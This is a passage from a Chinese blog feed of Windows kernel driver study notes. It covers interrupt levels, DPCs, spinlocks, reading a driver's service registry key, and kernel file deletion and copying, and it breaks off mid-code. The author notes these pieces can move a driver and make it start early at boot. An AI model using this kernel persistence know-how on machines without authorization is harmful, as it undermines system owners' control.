    <link href="https://joe1sn.eu.org/2024/03/19/windows-kernel-driver-5-thread-lock/"/>
    <id>https://joe1sn.eu.org/2024/03/19/windows-kernel-driver-5-thread-lock/</id>
    <published>2024-03-19T03:40:30.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>顺便复习操作系统了</p><span id="more"></span><h1 id="winos-相关原理"><a class="markdownIt-Anchor" href="#winos-相关原理"></a> WinOS 相关原理</h1><h2 id="中断级"><a class="markdownIt-Anchor" href="#中断级"></a> 中断级</h2><p>如果有时间的话可以试着玩一玩这个游戏：<a href="https://github.com/plbrault/youre-the-os">https://github.com/plbrault/youre-the-os</a><br />在线：<a href="https://plbrault.github.io/youre-the-os/">https://plbrault.github.io/youre-the-os/</a><br />或许在游玩的过程中你会自己总结出一套操作系统进程调度的一套方法，便于其他方法的理解</p><ul><li><p>调度方式：抢占式</p></li><li><p>最小执行单元：纤程-&gt;线程-&gt;进程</p></li><li><p>中断级( Irql ) 0-&gt;2级别越来越高，高级别可以打断低级别</p><ul><li><p>0：Pass level</p></li><li><p>1：Apc level</p></li><li><p>2:  Dpc level</p><p>ISR延迟调用，硬件中断后，不那么紧急的任务放在DPC队列中</p><p>DPC访问换页内存，页面换到磁盘中pagefile.sys，引起换页缺页中断，如果换页中断无法打断DPC，然后就会访问无效地址，造成BSOD，<strong>所以DPC中最好不要使用换页内存</strong>，也即要使用<code>nonpagedpool</code>，而不要使用<code>paged pool</code></p></li><li><p>hardware(io…)</p></li><li><p>强制打断：ipicall</p></li></ul></li></ul><hr /><h2 id="自旋锁"><a class="markdownIt-Anchor" href="#自旋锁"></a> 自旋锁</h2><p>有一间厕所，A进去后就锁上了厕所的门。B和C的其他就只有在门外排队等待</p><p>应用场景：</p><ol><li>操作危险数据：全局变量等（可以参考SQL）</li><li>可重入代码</li></ol><h1 id="编程相关"><a class="markdownIt-Anchor" href="#编程相关"></a> 编程相关</h1><h2 id="中断级-2"><a class="markdownIt-Anchor" href="#中断级-2"></a> 中断级</h2><p>获取自身中断级别：<code>KeGetCurrentIrql()</code></p><p>升级到DPC：<code>KeRaiseIrqlToDpcLevel</code></p><p>降级：<code>KeLowerIrql</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Current Irql %d\nNow Try Raise to DPC\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">KIRQL irql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">irql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;After, Current Irql %d\nNow Try decrease to Pass\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line"><span class="built_in">KeLowerIrql</span>(irql);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;End, Current Irql %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f8a151dfb7251cac0df165f46d55d1dc.png" alt="image-20240319120411828" /></p><p>将线程保持在DPC会导致蓝屏</p><p>应用：希望函数在该线程执行中：1.不被中断，2：相关目标不被执行或者修改等<br />MSDN中有每个内核函数的中断级</p><p>创建<code>DPC</code>线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DpcRoutineFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Current Irql: %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">    <span class="built_in">DpcRoutineFunc</span>(<span class="literal">NULL</span>);</span><br><span class="line">    KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">KeInitializeDpc</span>(&amp;kDPC, (PKDEFERRED_ROUTINE)DpcRoutineFunc, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">KeInsertQueueDpc</span>(&amp;kDPC, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/96a0d5ff9e79d3cff2a3a7b55d7cc284.png" alt="image-20240319132207124" /></p><p>DPC中调用<code>ZwOpenFile</code>之类的会BSOD</p><h2 id="自旋锁-2"><a class="markdownIt-Anchor" href="#自旋锁-2"></a> 自旋锁</h2><p>一般的自旋锁都是全局变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">KeInitializeSpinLock</span>(&amp;kSpinLock);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;SpinLock init\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeAcquireSpinLock</span>(&amp;kSpinLock, &amp;irql);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;SpinLock Locked\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeReleaseSpinLock</span>(&amp;kSpinLock, irql);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;SpinLock Delocked\n&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/18a36fa375def74acfc677a3d2b4d42a.png" alt="image-20240319130611722" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/de072b093fecf39c949ca7a6c5f18720.png" alt="image-20240319130947718" /></p><p>加锁这个函数会会提升到DPC中，但是DPC不能访问可分页内存，例如Ring3下的PCB中的LDR</p><p>视频给出了一个技巧</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e9622aaae7767eaa047e1a96c6a0d4c1.png" alt="image-20240319131322729" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;顺便复习操作系统了&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 4-内核注册表</title>
    <link href="https://joe1sn.eu.org/2024/03/18/windows-kernel-driver-4-reg/"/>
    <id>https://joe1sn.eu.org/2024/03/18/windows-kernel-driver-4-reg/</id>
    <published>2024-03-18T04:34:17.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>使用内核注册表实现开机启动驱动等</p><span id="more"></span><h1 id="内核注册表"><a class="markdownIt-Anchor" href="#内核注册表"></a> 内核注册表</h1><p>驱动创建描述符<code>SYM_NAME</code>后，会出现在注册表<code>计算机\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services</code>中</p><p>启动项的名字为驱动的文件名，例如<code>hevd_2</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b528aa7e87d652d8b4120c16e3215e0e.png" alt="image-20240318124522823" /></p><ul><li>Start：2-开机自启动、3-手动启动、4-禁用，数字越小启动越早</li></ul><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/56cf71331d4e2d9b0efd73ac2165aa49.png" alt="image-20240318124919612" /></p><p>打开注册表<code>ZwCreateKey</code>和<code>ZwOpenKey</code></p><h1 id="移动驱动启动位置并修改注册表"><a class="markdownIt-Anchor" href="#移动驱动启动位置并修改注册表"></a> 移动驱动启动位置并修改注册表</h1><p><code>ZwCreateKey</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">HANDLE hRegKey = <span class="literal">NULL</span>;</span><br><span class="line">OBJECT_ATTRIBUTES RegAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ULONG KeyOp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">InitializeObjectAttributes</span>(&amp;RegAttribute, RegistryPath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">status = <span class="built_in">ZwCreateKey</span>(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute, <span class="number">0</span>, <span class="literal">NULL</span>, REG_OPTION_NON_VOLATILE, &amp;KeyOp);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (KeyOp == REG_CREATED_NEW_KEY) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create New key\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (KeyOp == REG_OPENED_EXISTING_KEY) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Registry key opened\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ZwOpenKey</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelReg</span><span class="params">(PUNICODE_STRING RegistryPath)</span> </span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    HANDLE hRegKey = <span class="literal">NULL</span>;</span><br><span class="line">    OBJECT_ATTRIBUTES RegAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ULONG KeyOp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    PVOID KeyInfo = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, <span class="number">0x1000</span>, <span class="string">&#x27;kcaH&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (KeyInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Allocate Mem Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(KeyInfo, <span class="number">0x1000</span>);</span><br><span class="line">    UNICODE_STRING regKeyName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;regKeyName, <span class="string">L&quot;ImagePath&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;RegAttribute, RegistryPath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//status = ZwOpenKey(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute, 0, NULL, REG_OPTION_NON_VOLATILE, &amp;KeyOp);</span></span><br><span class="line">    status = <span class="built_in">ZwOpenKey</span>(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Open Reg Key Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    status = <span class="built_in">ZwQueryValueKey</span>(hRegKey, &amp;regKeyName, KeyValuePartialInformation, KeyInfo, <span class="number">0x1000</span> - <span class="number">1</span>, &amp;KeyOp);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Read Reg Key Failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hRegKey);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(KeyInfo);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    PKEY_VALUE_PARTIAL_INFORMATION tempinfo = (PKEY_VALUE_PARTIAL_INFORMATION)KeyInfo;</span><br><span class="line">    PWCHAR tempName = (PWCHAR)(tempinfo-&gt;Data);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;reg: %wZ, key: %wZ, Value: %ws\n&quot;</span>, RegistryPath,regKeyName, tempName);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ZwClose</span>(hRegKey);</span><br><span class="line">    <span class="built_in">ExFreePool</span>(KeyInfo);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3fa2d8bb5f3f4488544999bdab3c0d88.png" alt="image-20240318134033598" /></p><p>再加上<code>ZwSetValue</code>和之前的文件复制，就能实现这个功能了，但是需要更多的技巧来提升启动时的运行位置更早。</p><p>也可以使用微软封装函数<code>RtlWriteRegistryValue</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用内核注册表实现开机启动驱动等&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 3-文件操作</title>
    <link href="https://joe1sn.eu.org/2024/03/17/windows-kernel-driver-3/"/>
    <id>https://joe1sn.eu.org/2024/03/17/windows-kernel-driver-3/</id>
    <published>2024-03-17T08:51:33.000Z</published>
    <updated>2025-01-26T14:46:00.752Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过：<a href="https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/">windows内核驱动 1-环境搭建</a>、<a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">windows内核驱动 2-页表探索</a></p><p>但是内容确实有点衔接不上，这里根据<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">【Win Pwn】HEVD-内核栈溢出(上)</a>中展示的基础技巧来继续</p><span id="more"></span><h1 id="项目结构优化"><a class="markdownIt-Anchor" href="#项目结构优化"></a> 项目结构优化</h1><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/74db52682cbce590b8491fd618edceff.png" alt="image-20240317165802241" /></p><p>之前写过的所有功能都在<code>main.c</code>中，新加入<code>IoctlFuncs</code>，这里来写所有的ioctl功能，那么就要重新设计<code>MyControl</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"></span><br><span class="line">ULONG ioInfo = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (ioCode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IOCTL_MUL:</span><br><span class="line">&#123;</span><br><span class="line">    DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">    inData *= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">    *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;</span><br><span class="line">    ioInfo = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    RET = STATUS_UNSUCCESSFUL;</span><br><span class="line">    ioInfo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里分析得到我们需要的函数，大概可以声明为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ULONG <span class="title">Mul</span><span class="params">(PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">    DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">    inData *= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">    *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;</span><br><span class="line">    <span class="keyword">return</span> (ULONG)inData;</span><br><span class="line">    <span class="comment">//return 4;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意新建的文件要以<code>.c</code>结尾</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/07c3633604ed202bd0922197da264525.png" alt="image-20240317171836424" /></p><h1 id="文件操作"><a class="markdownIt-Anchor" href="#文件操作"></a> 文件操作</h1><ul><li><code>ZwXXXX</code> -&gt; <code>系统检查</code> -&gt; <code>NtXXXX</code></li><li>R3下都一样</li></ul><h2 id="文件删除"><a class="markdownIt-Anchor" href="#文件删除"></a> 文件删除</h2><p>使用到的API是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS <span class="title">ZwDeleteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] POBJECT_ATTRIBUTES ObjectAttributes</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_OBJECT_ATTRIBUTES</span> &#123;</span><br><span class="line">  ULONG           Length;</span><br><span class="line">  HANDLE          RootDirectory;</span><br><span class="line">  PUNICODE_STRING ObjectName;</span><br><span class="line">  ULONG           Attributes;</span><br><span class="line">  PVOID           SecurityDescriptor;</span><br><span class="line">  PVOID           SecurityQualityOfService;</span><br><span class="line">&#125; OBJECT_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>初始化改参数的api</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">InitializeObjectAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          POBJECT_ATTRIBUTES   p,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PUNICODE_STRING      n,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG                a,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE               r,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PSECURITY_DESCRIPTOR s</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>整个函数以及使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelDeleteFile</span><span class="params">(PWCHAR filePath)</span> </span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    UNICODE_STRING FilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;FilePath, filePath);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;[Kernel Delete File] The File Path is %wZ\n&quot;</span>, FilePath);</span><br><span class="line"></span><br><span class="line">    OBJECT_ATTRIBUTES FileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;FileAttribute, &amp;FilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    status = <span class="built_in">ZwDeleteFile</span>(&amp;FileAttribute);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//.........</span></span><br><span class="line">    <span class="built_in">KernelDeleteFile</span>(<span class="string">L&quot;\\??\\C:\\exp.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/eac1ddebf14c4632fc4ed20ec4c1c2bd.png" alt="image-20240317174745958" /></p><h2 id="文件复制"><a class="markdownIt-Anchor" href="#文件复制"></a> 文件复制</h2><p>属于是把大象装进冰箱分几步</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelCopyFile</span><span class="params">(PWCHAR dstFile, PWCHAR srcFile)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1-Declear Related Variable</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    UNICODE_STRING DstFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    UNICODE_STRING SrcFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DstFilePath, dstFile);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SrcFilePath, srcFile);</span><br><span class="line">    IO_STATUS_BLOCK IoBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSrcFile = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hDstFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//----------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2-Init Related Variable</span></span><br><span class="line">    OBJECT_ATTRIBUTES DstFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    OBJECT_ATTRIBUTES SrcFileAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;DstFileAttribute, &amp;DstFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;SrcFileAttribute, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3-Open File</span></span><br><span class="line">    status = <span class="built_in">ZwOpenFile</span>(&amp;hSrcFile, GENERIC_ALL, &amp;SrcFileAttribute, &amp;IoBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Open File %wZ Failed, status: %x\n&quot;</span>, SrcFilePath, status);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    